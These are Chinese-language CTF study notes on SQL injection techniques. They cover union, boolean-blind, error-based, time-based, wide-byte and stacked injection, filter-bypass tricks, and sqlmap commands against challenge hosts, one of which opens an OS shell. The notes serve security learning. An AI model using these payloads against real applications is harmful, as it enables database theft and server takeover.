# sql注入原始

### [附件: sqli知识点.pdf](./attachments/oQ-C8Ivek-XYQoXs/sqli知识点.pdf)

起手：先加`'`看是否报错，如果报错，留意看报错语句，是否有可用信息，判断是字符还是数字型(+-1)

'2-1'

1. 如果1和2-1返回的结果同：数字型。
2. 如果1和2-1返回的结果不同：字符型。php会把'2-1'的值当成2

字符型：转成2，返回2的数据/查不出内容

数字型：返回1的数据

绕过正则：`SEL/**/ECT`~~, ~~`~~SEL(ECT),~~`~~ ~~`~~CONCAT('sel','ect')~~`

union all

union select 1, 2, database(),

发现有注入，直接select 1, 2, flag from...

联合查询快很多

一个一个的加符号，看看他到底过滤了哪个

### 注释

`#` mysql的注释，确定数据库是mysql后，推荐使用（不需要+），但是在url中，如果直接用#，浏览去会认为是前端的锚点，不会传到后台，所以要传`%23`

`--` sql标准注释，缺点是后面要接一个空格，在url中常用`+`代替

`--+` 在url中常用，但在裸 SQL 下会出错

> 在 URL 或 Web 表单中，`+` 有时会被当作空格，这就是为什么一些注入教程里 `--+` 还能用，但在裸 SQL 下会出错，在 URL 中注入时，`--+` 更常见，而在标准 SQL 注入中，`-- `更为常用。
>
> `--%20` 也可以替代 `--+`，效果相同。

mysql/mariadb且表单：#

url：--+

否则要编码

### 数字型

* 通过加减乘除，判断参数附近有没有引号
* ORDER BY 看表的列数

SELECT title, content FROM news WHERE id = 1 ORDER BY 2;

* UNION 数据展示到页面上，数据列数要和 ORDER BY 的一致

SELECT title, content FROM news WHERE id = 1 UNION SELECT USER, pwd FROM user;

* id=3-1;和id=2;回显页面一致，判断存在sql注入
* id=-1 （或其他不存在的id）可不显示原有数据，而是显示union后的数据
* table\_name 字段是information\_schema库的tables表的表名字段
 * id = -1 union select 1, 2, group\_concat(table\_name) from information\_schema.tables where table\_schema=database();

### information\_scheme数据库

```
- MySQL5.0 版本后 默认自带，能查询到SQL所有数据库名，列名，表名
- table表中的table_name
```

### 利用表达式和类型强制转换判断字符型还是数字型

* id=3-2
* id=2a

| '1' = 1 | '1a'=1 | 'a'=0 |
| --- | --- | --- |
| ✅ | ✅ | ✅ |

### 布尔盲注

利用where后为true返回，false不返回的特性，猜测数据库名、表名

两个字符串处理函数

* `substring ` SQL 标准函数 ，通用性强
* `mid` 仅 MySQL 等几个数据库支持
* `SELECT title, content, FROM news WHERE id = '1' AND (SELECT MID((SELECT concat(user, 0x7e, pwd) FROM user), 1, 1)) = 'a'` 如果user第一位为 'a'，就返回
* `SELECT name FROM user WHERE id = 1 AND (MID((SELECT database()), 1, 1)='c');`
* `AND LENGTH(database()) > 6;`
* `AND ASCII(SUBSTR(database(), 1, 1)) > 77; //第1位，长度为1的字串`

### 报错注入

利用updatexml执行时，把错误的参数内容返回到前端的特性。构造和数据库信息有关的错误语句

* updatexml(XML\_DOCUMENT, XPATH\_STRING, NEW\_VALUE)
 * XML\_DOCUMENT 是XML格式的数据
 * XPATH\_STRING是XPath表达式，XPATH\_STRING不正确的话，MySQL会抛 错误信息
* select updatexml(1, concat(0x7e, (select database()), 0x7e), 1);

0x7e 是 ~ ，作分隔用的

只有当 updataxml 尝试执行第二个参数（XPath 表达式）时，才会验证 XPath 的有效性

concat(0x7e, (select database()), 0x7e)这条语句会触发错误，如组成了~my\_database\_name~，执行~my\_database\_name~这条语句时报错，并把错误语句返回给攻击者

* select id from news where id = '1' or updatexml(1, concat(0x7e, (select database())), 1 ) 可输出当前数据库名

### 时间盲注

时间盲注适用于那些页面没有返回错误信息，也没有直接输出查询结果的场景

猜解数据库名

`SELECT IF((SELECT database()) = 'test_db', SLEEP(5), 0);`

逐字符盲注

`SELECT IF(ASCII(SUBSTRING((SELECT database()), 1, 1)) = 116, SLEEP(5), 0);`

#### 手工注入

```sql
SELECT group_concat(schema_name) FROM information_schema.schemata;
SELECT database(); -- 只看当前数据库
SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema='aa' -- 
SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='bb';
SELECT group_concat(cc) FROM 数据库名.表名;
```

#### mysql命令

```sql
#GET
python .\sqlmap.py -u http://node4.anna.nssctf.cn:28184/?wllm=1 --dbs
python .\sqlmap.py -u http://node4.anna.nssctf.cn:28184/?wllm=1 --current-db
python .\sqlmap.py -u http://node4.anna.nssctf.cn:28184/?wllm=1 --tables -D "test_db"
python .\sqlmap.py -u http://node4.anna.nssctf.cn:28184/?wllm=1 --columns -T "test_tb" -D "test_db"
python .\sqlmap.py -u http://node4.anna.nssctf.cn:28184/?wllm=1 --dump -C "flag" -T "test_tb" -D "test_db"
python sqlmap.py -u http://challenge.qsnctf.com:36821/?id=1  --os-shell
#POST
python sqlmap.py -u http://challenge.qsnctf.com:36821/?id=1 --data="id=1"
```

### 宽字节注入

宽字节是对于ascii这样的单字节而言，GBK，GB2312这些宽字节编码，实际上只有两个字节

GBK多字符编码，通常一个汉字占用2个字节，一个utf-8汉字占3个字节

转义函数：用`\`对特殊字符进行过滤

### 堆叠注入

没法用SELECT的情况下

sql:`SELECT * FROM TABLE WHERE id = '$id';`

堆叠注入:

* `1'; show databases#`
* `1'; show tables#`
* `1'; show columns from `1919810931114514`#` 注意是\`\`\`\` 反引号
 * 特殊表名（`order`，带`-`的表名等）必须加反引号
 * 如果不加任何反引号，会理解为一个数字常量
 * 如果写普通单引号，会理解为一个字符串常量
* `1'; prepare st from concat('se', 'lect', '* from `1919810931114514`'); execute st;--+`
 * 过滤了SELECT，用预处理绕过
* 1;
